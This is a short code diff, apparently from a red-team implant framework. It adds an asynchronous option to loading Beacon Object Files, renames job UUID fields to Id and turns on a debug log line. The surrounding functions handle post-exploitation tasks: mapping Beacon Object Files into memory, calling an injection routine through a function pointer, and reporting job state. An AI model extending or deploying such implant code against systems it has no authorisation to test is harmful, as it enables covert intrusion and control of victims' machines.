@@ -139,7 +139,7 @@ auto DECLFN Task::Postex(
         if ( BofLen > 0 && !Self->Postex.IsLoaded ) {
             Self->Postex.Mapped = (COFF_MAPPED*)KhAlloc( sizeof(COFF_MAPPED) );
 
-            if ( ! Self->Cf->Map( BofData, BofLen, Self->Postex.Mapped ) ) {
+            if ( ! Self->Cf->Map( FALSE, BofData, BofLen, Self->Postex.Mapped ) ) {
                 KhDbg("ERROR: Failed to map BOF");
                 Self->Pkg->Int32( Package, 0 );
                 return KhGetError;
@@ -177,9 +177,9 @@ auto DECLFN Task::Postex(
         ULONG ArgsLen = 0;
         PBYTE Args    = (PBYTE)Self->Psr->Bytes( Parser, &ArgsLen );
 
-        Self->Config.Postex.CurrentUUID = Job->UUID;
+        Self->Config.Postex.CurrentId = Job->Id;
         ((BOOL(*)(char*, int))Self->Postex.fn_inject)( (char*)Args, ArgsLen );
-        Self->Config.Postex.CurrentUUID = nullptr;
+        Self->Config.Postex.CurrentId = nullptr;
 
         Self->Pkg->Int32( Package, 1 );
 
@@ -253,16 +253,17 @@ auto DECLFN Task::ExecBof(
     ULONG BofLen   = 0;
     PBYTE BofBuff  = Self->Psr->Bytes( Parser, &BofLen );
     ULONG BofCmdID = Self->Psr->Int32( Parser );
+    BOOL  BofAsync = Self->Psr->Int32( Parser );
     ULONG BofArgc  = 0;
     PBYTE BofArgs  = Self->Psr->Bytes( Parser, &BofArgc );
 
     KhDbg("bof id    : %d", BofCmdID);
-    // KhDbg("bof async : %s", BofAsync ? "true" : "false");
+    KhDbg("bof async : %s", BofAsync ? "true" : "false");
     KhDbg("bof args  : %p [%d bytes]", BofArgs, BofArgc);
 
     Self->Pkg->Int32( Self->Pkg->Shared, BofCmdID );
 
-    Success = Self->Cf->Loader( BofBuff, BofLen, BofArgs, BofArgc );
+    Success = Self->Cf->Loader( BofAsync, BofBuff, BofLen, BofArgs, BofArgc );
 
     if ( Success ) {
         return KhRetSuccess;
@@ -1709,7 +1710,7 @@ auto DECLFN Task::Jobs(
         Self->Pkg->Int32( Package, Self->Jbs->Count );
 
         while ( Current ) {
-            Self->Pkg->Str( Package, Current->UUID );
+            Self->Pkg->Str( Package, Current->Id );
             Self->Pkg->Int32( Package, Current->CmdID );
             Self->Pkg->Int32( Package, Current->State );
 
